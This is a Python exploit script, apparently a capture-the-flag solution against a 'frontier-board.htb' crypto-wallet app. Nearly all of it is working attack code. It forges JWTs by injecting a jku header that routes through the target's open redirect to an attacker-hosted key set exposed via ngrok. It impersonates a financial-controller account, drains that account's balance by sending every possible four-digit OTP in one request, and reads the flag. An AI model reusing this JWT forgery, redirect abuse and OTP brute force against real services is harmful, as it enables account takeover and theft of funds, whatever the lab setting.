#!/usr/bin/env python3

import json
import jwt
import requests

from http.server import HTTPServer, SimpleHTTPRequestHandler

from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes

from pwn import base64, log, os, sys, Thread


class QuietHTTPRequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass


def int_to_b64(x: int) -> str:
    return base64.urlsafe_b64encode(long_to_bytes(x)).decode()  


def generate_rsa_keys():
    private_key = RSA.generate(2048)
    return private_key, private_key.public_key()


def generate_jwks(public_key: RSA.RsaKey, kid: str):
    with open('jwks.json', 'w') as f:
        key = {
            'kty': 'RSA',
            'kid': kid,
            'use': 'sig',
            'alg': 'RS256',
            'e': int_to_b64(int(public_key.e)),
            'n': int_to_b64(int(public_key.n))
        }
        json.dump({'keys': [key]}, f, indent=2)


def main():
    host = sys.argv[1]
    ngrok = sys.argv[2]

    Thread(target=HTTPServer(('', 8000), QuietHTTPRequestHandler).serve_forever).start()

    target_email = 'financial-controller@frontier-board.htb'
    email = 'asdf@asdf.com'
    password = 'asdf'

    log.info(f'Registering account: {email}')
    requests.post(f'http://{host}/api/auth/register', json={'email': email, 'password': password})
    auth = requests.post(f'http://{host}/api/auth/login', json={'email': email, 'password': password}).json()
    token = auth.get('token')
    log.success(f'Token: {token}')

    log.info(f'Generating malicious jwks...')
    jwks = requests.get(f'http://{host}/.well-known/jwks.json').json()
    kid = jwks.get('keys')[0].get('kid')
    private_key, public_key = generate_rsa_keys()
    log.info(f'Found kid: {kid}')
    generate_jwks(public_key, kid)
    jku = f'http://127.0.0.1:1337/api/analytics/redirect?url={ngrok}/jwks.json&ref=x'
    target_token = jwt.encode(
        payload={'email': target_email},
        key=private_key.export_key().decode(),
        algorithm='RS256',
        headers={'kid': kid, 'jku': jku}
    )
    log.success(f'Target token: {target_token}')

    balances = requests.get(
        f'http://{host}/api/crypto/balance',
        headers={'Authorization': f'Bearer {target_token}'}
    ).json()
    balance = [b for b in balances if b.get('availableBalance', 0) > 0][0]
    amount = balance.get('availableBalance')
    coin = balance.get('symbol')
    log.info(f'Target balance: {amount} {coin}')

    transaction = requests.post(
        f'http://{host}/api/crypto/transaction',
        headers={'Authorization': f'Bearer {target_token}'},
        json={
            "to": email,
            "coin": coin,
            "amount": amount,
            "otp": [f'{i:04d}' for i in range(10000)]
        }).json()

    log.info('Transaction successful')
    assert transaction.get('success')

    dashboard = requests.get(
        f'http://{host}/api/dashboard',
        headers={'Authorization': f'Bearer {target_token}'}
    ).json()
    flag = dashboard.get('flag')

    log.success(f'Flag: {flag}')
    os._exit(0)


if __name__ == '__main__':
    main()
